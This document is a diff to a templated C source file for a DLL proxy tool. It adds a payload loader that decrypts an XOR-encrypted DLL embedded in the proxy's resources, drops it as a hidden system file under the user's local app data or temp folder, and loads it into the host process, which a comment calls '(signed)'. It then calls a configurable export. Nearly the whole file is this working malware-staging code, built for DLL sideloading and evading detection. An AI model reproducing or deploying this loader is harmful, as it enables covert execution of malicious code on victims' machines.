@@ -2,7 +2,91 @@
 /* Proxy for: {{ dll_name }} */
 
 #include "payload.h"
+{% if payload_bin_enabled %}
+#include "resource.h"
 
+static const unsigned char _pk[] = { {{ payload_xor_key | join(', ') }} };
+static const unsigned int  _pkl  = {{ payload_xor_key | length }};
+
+static void _pmkdirs(const char *path) {
+    char buf[MAX_PATH];
+    lstrcpyA(buf, path);
+    for (char *p = buf; *p; p++) {
+        if (*p == '\\') {
+            *p = '\0';
+            CreateDirectoryA(buf, NULL);
+            *p = '\\';
+        }
+    }
+    CreateDirectoryA(buf, NULL);
+}
+
+DWORD WINAPI payload_main(LPVOID lpParam) {
+    HMODULE hSelf = (HMODULE)lpParam;
+
+    /* --- Locate embedded payload DLL in resources --- */
+    HRSRC hRes = FindResourceA(hSelf, MAKEINTRESOURCEA(IDR_PAYLOAD_BIN), "BINARY");
+    if (!hRes) return 1;
+    HGLOBAL hGlobal = LoadResource(hSelf, hRes);
+    if (!hGlobal) return 1;
+    LPVOID pData = LockResource(hGlobal);
+    DWORD  dwSize = SizeofResource(hSelf, hRes);
+    if (!pData || dwSize == 0) return 1;
+
+    /* --- Build stash path --- */
+    char szBase[MAX_PATH];
+    if (!GetEnvironmentVariableA("LOCALAPPDATA", szBase, MAX_PATH))
+        GetTempPathA(MAX_PATH, szBase);
+
+    char szDir[MAX_PATH];
+    lstrcpyA(szDir, szBase);
+    lstrcatA(szDir, "\\{{ payload_stash_dir }}");
+    _pmkdirs(szDir);
+
+    char szPath[MAX_PATH];
+    lstrcpyA(szPath, szDir);
+    lstrcatA(szPath, "\\{{ payload_stash_filename }}");
+
+    /* --- Decrypt and extract (skip if already on disk) --- */
+    if (GetFileAttributesA(szPath) == INVALID_FILE_ATTRIBUTES) {
+        unsigned char *pClear = (unsigned char *)VirtualAlloc(
+            NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
+        if (!pClear) return 1;
+
+        const unsigned char *pSrc = (const unsigned char *)pData;
+        for (DWORD i = 0; i < dwSize; i++)
+            pClear[i] = pSrc[i] ^ _pk[i % _pkl];
+
+        HANDLE hFile = CreateFileA(szPath, GENERIC_WRITE, 0, NULL,
+                                   CREATE_ALWAYS,
+                                   FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM,
+                                   NULL);
+        if (hFile == INVALID_HANDLE_VALUE) {
+            VirtualFree(pClear, 0, MEM_RELEASE);
+            return 1;
+        }
+
+        DWORD dwWritten;
+        WriteFile(hFile, pClear, dwSize, &dwWritten, NULL);
+        CloseHandle(hFile);
+        VirtualFree(pClear, 0, MEM_RELEASE);
+        if (dwWritten != dwSize) return 1;
+    }
+
+    /* --- Load payload DLL into the current (signed) process --- */
+    HMODULE hPayload = LoadLibraryA(szPath);
+{% if payload_export %}
+    if (hPayload) {
+        typedef void (*PayloadExport)(void);
+        PayloadExport fn = (PayloadExport)GetProcAddress(hPayload, "{{ payload_export }}");
+        if (fn) fn();
+    }
+{% endif %}
+
+    return 0;
+}
+
+{% else %}
 /*
  * This function runs in a separate thread after the proxy DLL is loaded.
  * All exports are resolved and forwarding is active when this executes.
@@ -21,3 +105,4 @@ DWORD WINAPI payload_main(LPVOID lpParam) {
     OutputDebugStringA("[DLL Proxy] Payload thread finished\n");
     return 0;
 }
+{% endif %}
